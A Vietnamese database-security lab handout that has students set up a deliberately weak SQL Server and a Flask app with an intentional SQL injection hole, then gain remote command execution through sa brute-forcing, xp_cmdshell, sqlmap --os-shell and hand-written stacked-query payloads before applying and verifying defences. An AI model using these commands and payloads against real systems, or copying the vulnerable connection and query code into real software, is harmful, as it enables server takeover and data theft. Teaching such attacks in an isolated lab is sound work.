@@ -1,0 +1,382 @@
+=== PAGE 1 ===
+DBS401 — DATABASE SECURITY 
+ 
+LAB CHƯƠNG 4: CÀI ĐẶT, TẤN CÔNG VÀ 
+THỰC THI LỆNH TỪ XA TRÊN MICROSOFT SQL SERVER 
+ 
+Mục tiêu 
+• Cài SQL Server và nhận diện các quyết định an ninh lúc cài (chế độ xác thực, tài khoản dịch vụ, giao thức). 
+• Trinh sát máy chủ qua cổng 1433 / SQL Browser 1434. 
+• Đạt RCE theo hai đường: (A) brute-force sa; (B) qua SQL Injection. 
+• Bật và dùng xp_cmdshell để chạy lệnh hệ điều hành; xác định tài khoản dịch vụ. 
+• Cấu hình phòng thủ và chứng minh cùng chuỗi tấn công thất bại. 
+I. Kiến thức nền 
+Chuỗi tấn công 
+[1] Đường vào   →  (A) sa yếu / 1433     HOẶC     (B) SQL Injection ở web app 
+        │ 
+[2] Chạy được câu lệnh SQL với vai trò sysadmin 
+        │ 
+[3] Bật xp_cmdshell 
+        │ 
+[4] EXEC xp_cmdshell 'whoami'   →  chạy lệnh hệ điều hành từ xa (RCE) 
+        │ 
+[5] Lệnh chạy dưới quyền tài khoản dịch vụ SQL Server 
+ 
+xp_cmdshell là extended stored procedure cho chạy lệnh Windows từ trong CSDL. Nó tắt mặc định, nhưng vai trò 
+sysadmin tự bật lại được — nên có xp_cmdshell ≈ có sysadmin. 
+Ba cấu hình lúc cài mở ra chuỗi trên (bạn sẽ cố tình cài sai ở Phần 1): 
+Cấu hình lúc cài 
+Vì sao nguy hiểm 
+Mở ra 
+Mixed Mode 
+Bật SQL login → có tài khoản sa để brute-force. Windows 
+Auth thì không. 
+Nhánh A [1] 
+sa mật khẩu yếu 
+sa là sysadmin cao nhất; tên luôn là 'sa' nên chỉ phải đoán 
+mật khẩu. 
+Nhánh A [2] 
+App kết nối bằng sa 
+SQLi trong app kế thừa quyền sysadmin → bật được 
+xp_cmdshell. 
+Nhánh B [2][3] 
+ 
+ 
+
+
+=== PAGE 2 ===
+II. Chuẩn bị môi trường 
+Dựng hai máy ảo trên cùng một mạng host-only (VirtualBox: Host-only Adapter; VMware: Host-only): 
+• Target: Windows 10/11 hoặc Server 2019/2022 — cài SQL Server + web app. 
+• Attacker: Kali Linux — có nmap, netexec, impacket, sqlmap. 
+Bước 1 — Đặt IP cùng dải và kiểm tra thông nhau 
+Trên Target, mở PowerShell và xem IP host-only: 
+ipconfig    # ghi lại IPv4 của card host-only, ví dụ 192.168.56.10 
+Trên Kali, xem IP và bảo đảm cùng dải (vd 192.168.56.x): 
+ip a        # ví dụ Kali = 192.168.56.20 
+Nếu card không có IP: đặt IP tĩnh thủ công cùng dải 192.168.56.0/24 cho cả hai. Trong bài dùng ký hiệu 
+<TARGET_IP>. 
+Bước 2 — Snapshot cả hai VM 
+Chụp snapshot trước khi bắt đầu — Phần 7 sẽ khôi phục lại nếu cần. 
+Bước 3 — Kiểm tra công cụ trên Kali 
+nmap --version 
+nxc --version              # NetExec 
+mssqlclient.py -h          # Impacket 
+sqlmap --version 
+# Nếu thiếu: 
+sudo apt update && sudo apt install -y nmap sqlmap netexec impacket-scripts 
+ 
+ 
+
+
+=== PAGE 3 ===
+III. Phần 1 — Cài SQL Server (cấu hình yếu có chủ ý) 
+Trên Target: tải SQL Server 2022 Developer Edition (miễn phí) và SSMS từ trang Microsoft. Chạy bộ cài → New SQL 
+Server stand-alone installation. 
+Bước 1 — Ba màn hình phải dừng lại 
+1. Instance Configuration: chọn Default instance (dùng cổng 1433). 
+2. Authentication Mode: chọn Mixed Mode; mật khẩu sa = Password1 (cố tình yếu); bấm Add Current User. 
+3. Service Accounts: để mặc định và ghi lại tài khoản của SQL Server Database Engine (Phần 6 dùng lại). 
+Bước 2 — Bật TCP/IP, SQL Browser, mở tường lửa 
+Mở SQL Server Configuration Manager: 
+• Network Configuration → Protocols → bật TCP/IP. 
+• Services → SQL Server Browser = Running. 
+• Khởi động lại SQL Server (MSSQLSERVER). 
+Mở cổng cho lab — PowerShell (Run as administrator) trên Target: 
+New-NetFirewallRule -DisplayName "LAB MSSQL" -Direction Inbound -Protocol TCP -LocalPort 1433 -
+Action Allow -Profile Any 
+New-NetFirewallRule -DisplayName "LAB Browser" -Direction Inbound -Protocol UDP -LocalPort 1434 -
+Action Allow -Profile Any 
+New-NetFirewallRule -DisplayName "LAB WEB" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action 
+Allow -Profile Any 
+New-NetFirewallRule -DisplayName "LAB PING" -Direction Inbound -Protocol ICMPv4 -IcmpType 8 -Action 
+Allow -Profile Any 
+Vì sao cần các rule này 
+Tường lửa Windows chặn mọi kết nối vào mặc định. Không mở 1433 thì Kali không thấy SQL Server dù dịch vụ đang 
+chạy; không mở ICMP thì lệnh ping cũng không thông. Đây là các rule tạm cho lab, gỡ ở Phần Dọn dẹp. 
+Bước 3 — Tạo dữ liệu (chạy trong SSMS bằng sa / Password1) 
+CREATE DATABASE shopdb; 
+GO 
+USE shopdb; 
+GO 
+CREATE TABLE products (id INT PRIMARY KEY, name NVARCHAR(100), price INT); 
+INSERT INTO products VALUES (1,N'Ban phim',500000),(2,N'Chuot',250000),(3,N'Man hinh',3000000); 
+CREATE TABLE customers (id INT PRIMARY KEY, fullname NVARCHAR(100), cccd VARCHAR(20), balance 
+BIGINT); 
+INSERT INTO customers VALUES (1,N'Nguyen Van A','037201099888',50000000),(2,N'Tran Thi 
+B','038155777222',12000000); 
+GO 
+Câu hỏi phân tích 
+1. Vì sao Mixed Mode mở ra tài khoản sa cho kẻ tấn công, còn Windows Auth thì không? 
+2. Bật SQL Browser (UDP 1434) đánh đổi tiện lợi lấy điều gì về an ninh? 
+ 
+ 
+
+
+=== PAGE 4 ===
+IV. Phần 2 — Web app dính SQL Injection 
+Trên Target: cài Python 3 và Microsoft ODBC Driver 18 for SQL Server (kèm theo SSMS, hoặc tải riêng). Rồi: 
+pip install flask pyodbc 
+Kiểm tra tên driver ODBC đã cài (dùng đúng tên này trong app.py): 
+python -c "import pyodbc; print(pyodbc.drivers())" 
+# Kết quả thường có: 'ODBC Driver 18 for SQL Server'  (hoặc 17) 
+Tạo file app.py — sửa dòng DRIVER= cho khớp tên ở trên: 
+from flask import Flask, request 
+import pyodbc 
+app = Flask(__name__) 
+  
+# LỖI CÓ CHỦ Ý: app kết nối bằng 'sa' (sysadmin) 
+CONN = ('DRIVER={ODBC Driver 18 for SQL Server};SERVER=localhost;' 
+        'DATABASE=shopdb;UID=sa;PWD=Password1;' 
+        'TrustServerCertificate=yes;Encrypt=no') 
+  
+@app.route('/product') 
+def product(): 
+    pid = request.args.get('id', '1') 
+    cn = pyodbc.connect(CONN, autocommit=True) 
+    cur = cn.cursor() 
+    q = "SELECT id,name,price FROM products WHERE id = " + pid   # LỖI SQLi: ghép chuỗi 
+    try: 
+        cur.execute(q) 
+        rows = cur.fetchall() 
+        return '<br>'.join(str(tuple(r)) for r in rows) or 'no rows' 
+    except Exception as e: 
+        return 'SQL error: ' + str(e) 
+  
+app.run(host='0.0.0.0', port=5000) 
+Chạy: python app.py. Kiểm tra từ Kali: 
+curl "http://<TARGET_IP>:5000/product?id=1" 
+✓ Kết quả mong đợi 
+(1, 'Ban phim', 500000) 
+ 
+Nếu curl báo lỗi kết nối 
+SSL Provider / certificate: driver 18 mặc định mã hoá — đã thêm TrustServerCertificate=yes;Encrypt=no để 
+khắc phục. 
+Connection refused / timeout: kiểm tra app đang chạy, rule LAB WEB đã mở, và Kali ping được <TARGET_IP>. 
+Câu hỏi phân tích 
+1. Viết lại dòng q = ... cho đúng (tham số hoá). 
+2. Vì sao app kết nối bằng sa là yếu tố biến SQLi thành RCE? 
+ 
+Checklist trước khi tấn công (Phần 3–5) 
+
+
+=== PAGE 5 ===
+☐ Kali ping được <TARGET_IP>   ☐ nmap -p1433 <TARGET_IP> thấy cổng open   ☐ curl .../product?id=1 trả về 
+dòng sản phẩm   ☐ đăng nhập được SSMS bằng sa/Password1 
+ 
+ 
+
+
+=== PAGE 6 ===
+V. Phần 3 — Trinh sát 
+Từ Kali, coi như chỉ biết <TARGET_IP>: 
+nmap -p 1433 -sV --script ms-sql-info,ms-sql-ntlm-info <TARGET_IP> 
+nmap -sU -p 1434 --script ms-sql-info <TARGET_IP>       # hỏi SQL Browser 
+✓ Kết quả mong đợi 
+1433/tcp open  ms-sql-s  Microsoft SQL Server 2022 16.00.xxxx 
+| ms-sql-info: 
+|   Instance name: MSSQLSERVER 
+|   TCP port: 1433 
+Câu hỏi phân tích 
+1. Chỉ banner phiên bản (chưa đăng nhập) đã là một finding chưa? Vì sao recon quan trọng ngang khai thác? 
+2. Nếu tắt SQL Browser thì lệnh nmap UDP 1434 trả về gì? Công sức kẻ tấn công thay đổi ra sao? 
+ 
+ 
+
+
+=== PAGE 7 ===
+VI. Phần 4 — Nhánh A: brute-force sa → RCE 
+Bước 1 — Brute-force sa 
+printf 'admin\nsa\nPassword\nPassword1\nP@ssw0rd\n123456\n' > pw.txt 
+nxc mssql <TARGET_IP> -u sa -p pw.txt --local-auth 
+✓ Kết quả mong đợi 
+MSSQL  <TARGET_IP>  1433  TARGET  [+] TARGET\sa:Password1 (Pwn3d!) 
+#  (Pwn3d!) = tài khoản có quyền quản trị (sysadmin) 
+Bước 2 — Chạy lệnh (NetExec tự bật xp_cmdshell) 
+nxc mssql <TARGET_IP> -u sa -p Password1 --local-auth -x "whoami" 
+nxc mssql <TARGET_IP> -u sa -p Password1 --local-auth -x "ipconfig" 
+✓ Kết quả mong đợi 
+MSSQL  <TARGET_IP>  1433  TARGET  [+] Executed command via mssqlexec 
+MSSQL  <TARGET_IP>  1433  TARGET  nt service\mssqlserver 
+Bước 3 — Cách thủ công (hiểu từng câu SQL) 
+mssqlclient.py sa:Password1@<TARGET_IP> 
+  
+SQL> enable_xp_cmdshell 
+SQL> xp_cmdshell whoami 
+  
+# enable_xp_cmdshell thực chất chạy: 
+SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE; 
+SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; 
+ 
+Đây là RCE 
+xp_cmdshell 'whoami' trả về một tài khoản Windows = bạn đã chạy lệnh hệ điều hành từ xa. Trong lab dừng ở 
+whoami — bằng chứng ít phá hoại nhất. 
+Câu hỏi phân tích 
+1. Nếu sa dài 16 ký tự ngẫu nhiên, bước brute-force còn khả thi không? 
+2. Vì sao enable_xp_cmdshell cần vai trò sysadmin? Login chỉ có db_datareader bật được không? 
+ 
+ 
+
+
+=== PAGE 8 ===
+VII. Phần 5 — Nhánh B: qua SQL Injection → RCE 
+Bối cảnh: không biết mật khẩu sa, chỉ có web app cổng 5000. 
+Bước 1 — Xác nhận SQLi 
+curl "http://<TARGET_IP>:5000/product?id=1" 
+curl "http://<TARGET_IP>:5000/product?id=1%20or%201=1"      # trả nhiều dòng => có SQLi 
+curl "http://<TARGET_IP>:5000/product?id=0%20UNION%20SELECT%201,@@version,3" 
+✓ Kết quả mong đợi 
+# curl tra ve 1 dong, cac ban ghi ngan cach bang <br>: 
+(1, 'Ban phim', 500000)<br>(2, 'Chuot', 250000)<br>(3, 'Man hinh', 3000000) 
+# 'or 1=1' lam lo moi dong => co SQLi 
+Bước 2 — Tự động hoá bằng sqlmap (đường chắc chắn nhất) 
+sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --batch --dbms=mssql 
+sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --batch --dbms=mssql --os-shell 
+  
+os-shell> whoami 
+✓ Kết quả mong đợi 
+[*] the back-end DBMS is Microsoft SQL Server 
+[*] going to use xp_cmdshell to execute commands 
+os-shell> whoami 
+nt service\mssqlserver 
+Bước 3 — Thủ công: chạy lệnh mù rồi đọc kết quả qua UNION 
+Vì sao phải làm 3 bước 
+App chỉ trả về result set đầu tiên (câu SELECT). Khi tiêm stacked query, lệnh xp_cmdshell vẫn chạy nhưng output 
+nằm ở result set thứ hai — app không hiện. Đây là RCE mù: (1) bật xp_cmdshell → (2) chạy lệnh và hứng output vào 
+một bảng → (3) đọc bảng đó bằng UNION. 
+Vì app dùng sa nên mọi câu dưới kế thừa quyền sysadmin. Dùng script requests trên Kali để khỏi mã hoá URL thủ 
+công: 
+python3 - <<'PY' 
+import requests 
+B = "http://<TARGET_IP>:5000/product" 
+def send(pid): print(requests.get(B, params={'id': pid}).text[:300]); print('---') 
+  
+# (1) bật xp_cmdshell (mù) 
+send("1; EXEC sp_configure 'show advanced options',1;RECONFIGURE;" 
+     " EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; --") 
+  
+# (2) chạy whoami, hứng output vào bảng dbo.o (mù) 
+send("1; IF OBJECT_ID('dbo.o') IS NOT NULL DROP TABLE dbo.o;" 
+     " CREATE TABLE dbo.o(line NVARCHAR(4000));" 
+     " INSERT dbo.o EXEC xp_cmdshell 'whoami'; --") 
+  
+# (3) đọc output qua UNION -> hiện ở vị trí cột 'name' 
+send("0 UNION SELECT 1,(SELECT TOP 1 line FROM dbo.o WHERE line IS NOT NULL),3 --") 
+PY 
+
+
+=== PAGE 9 ===
+✓ Kết quả mong đợi 
+# request (3) tra ve output cua whoami o cot giua: 
+(1, 'nt service\mssqlserver', 3) 
+ 
+Hai cửa, một đích 
+Nhánh B vẫn tới RCE ngay cả khi cổng 1433 bị chặn hoàn toàn, vì nó đi qua cổng web 5000 và kế thừa quyền 
+sysadmin từ chuỗi kết nối của app. 
+Câu hỏi phân tích 
+1. Kẻ tấn công không biết mật khẩu sa. Vậy quyền sysadmin ở Nhánh B đến từ đâu? 
+2. Nếu app kết nối bằng login shop_ro chỉ có SELECT, SQLi còn dẫn tới RCE không? Còn đọc trộm bảng 
+customers không? 
+ 
+ 
+
+
+=== PAGE 10 ===
+VIII. Phần 6 — Tài khoản dịch vụ 
+Chạy xp_cmdshell 'whoami'. Tên trả về chính là tài khoản dịch vụ bạn chọn ở Phần 1. Kết quả điển hình: 
+whoami trả về 
+Nghĩa là 
+Kẻ tấn công làm tiếp được 
+nt service\mssqlserver 
+Tài khoản ảo, quyền hạn chế (đúng) 
+Bị giới hạn; còn SeImpersonate → thử leo lên 
+SYSTEM 
+nt authority\system 
+Chạy bằng LocalSystem (lỏng) 
+Toàn quyền máy: tạo admin, dump SAM, cài cửa 
+hậu 
+<domain>\sqlsvc 
+Tài khoản domain có quyền 
+Đi ngang sang máy khác, tấn công cả domain 
+ 
+Chốt: cùng một lỗ hổng, mức thiệt hại do màn hình Service Accounts quyết định — bấm qua trong vài giây lúc cài. 
+Câu hỏi phân tích 
+1. Nếu whoami trả về nt authority\system, liệt kê 3 việc kẻ tấn công làm được ngay. 
+2. Đặc quyền tối thiểu áp cho tài khoản dịch vụ SQL Server là gì? Vì sao không chạy engine bằng Administrator? 
+ 
+ 
+
+
+=== PAGE 11 ===
+IX. Phần 7 — Phòng thủ, rồi tấn công lại 
+Phần trọng tâm. Bịt từng lỗ hổng rồi chạy lại lệnh Phần 4–5 để thấy chúng thất bại. 
+1 — Tắt xp_cmdshell 
+EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; 
+EXEC sp_configure 'show advanced options', 0; RECONFIGURE; 
+2 — Vô hiệu sa, chuyển Windows Authentication 
+ALTER LOGIN sa DISABLE; 
+-- SSMS: Server Properties > Security > Windows Authentication mode > khởi động lại dịch vụ 
+-- Sau restart: đăng nhập lại SSMS bằng tài khoản Windows (đã thêm ở Add Current User) 
+3 — App dùng login quyền tối thiểu + tham số hoá 
+CREATE LOGIN shop_ro WITH PASSWORD = '<manh-ngau-nhien>'; 
+USE shopdb; CREATE USER shop_ro FOR LOGIN shop_ro; 
+ALTER ROLE db_datareader ADD MEMBER shop_ro; 
+Sửa app.py: UID=sa → UID=shop_ro; và tham số hoá: 
+q = "SELECT id,name,price FROM products WHERE id = ?" 
+cur.execute(q, (pid,)) 
+4 — Thu hẹp mạng & tài khoản dịch vụ 
+Set-Service SQLBrowser -StartupType Disabled; Stop-Service SQLBrowser 
+# Dịch vụ SQL Server chạy bằng virtual account, KHÔNG phải Administrator/LocalSystem 
+Kiểm chứng — tấn công lại, phải THẤT BẠI 
+nxc mssql <TARGET_IP> -u sa -p pw.txt --local-auth              # -> login failed (sa đã tắt) 
+sqlmap -u "http://<TARGET_IP>:5000/product?id=1" --dbms=mssql --os-shell   # -> không bật được 
+xp_cmdshell 
+# Sau khi tham số hoá: sqlmap báo không tìm thấy điểm tiêm 
+ 
+Điều bài lab chứng minh 
+Không có bước vá thần kỳ — chỉ là những lựa chọn đúng lẽ ra phải làm lúc cài. Cùng chuỗi tấn công, cấu hình đúng 
+thì đứt ngay ở bước [1] hoặc [3]. 
+ 
+ 
+
+
+=== PAGE 12 ===
+X. Tổng hợp — quyết định cài đặt ↔ mặt tấn công ↔ phòng thủ 
+Quyết định lúc cài 
+Nếu sai → mặt tấn công 
+Phòng thủ 
+Chế độ xác thực 
+Mixed Mode → có sa để brute-force 
+Windows Authentication 
+Mật khẩu sa 
+Yếu → lọt → sysadmin 
+Tắt sa / mật khẩu mạnh 
+Quyền kết nối của app 
+App dùng sa → SQLi → RCE 
+Login riêng, db_datareader, tham số 
+hoá 
+xp_cmdshell 
+Bật được → RCE 
+Tắt; hạn chế sysadmin 
+Tài khoản dịch vụ 
+LocalSystem/Admin → chiếm máy/domain 
+Virtual account, quyền tối thiểu 
+Giao thức & cổng 
+1433 mở rộng + Browser → dễ dò 
+Chỉ mở cho IP cần; tắt Browser 
+ 
+Ba nguyên tắc: (1) đặc quyền tối thiểu (tài khoản dịch vụ, login app, sysadmin); (2) bề mặt tấn công tối thiểu (cổng, 
+giao thức, xp_cmdshell, Browser); (3) quan sát (audit đăng nhập — nhất là các lần sa thất bại — và đọc log). 
+ 
+ 
+
+
+=== PAGE 13 ===
+XI. Proof of Lab 
+Nộp hai ảnh, mỗi ảnh có dòng danh tính ngay dưới kết quả: 
+1. Ảnh 1 — RCE: xp_cmdshell (hoặc os-shell) trả về tài khoản dịch vụ. 
+2. Ảnh 2 — Phòng thủ: chạy lại lệnh tấn công sau Phần 7, thấy nó thất bại. 
+Kèm báo cáo: giải thích từng bước. 
+ 
+
+
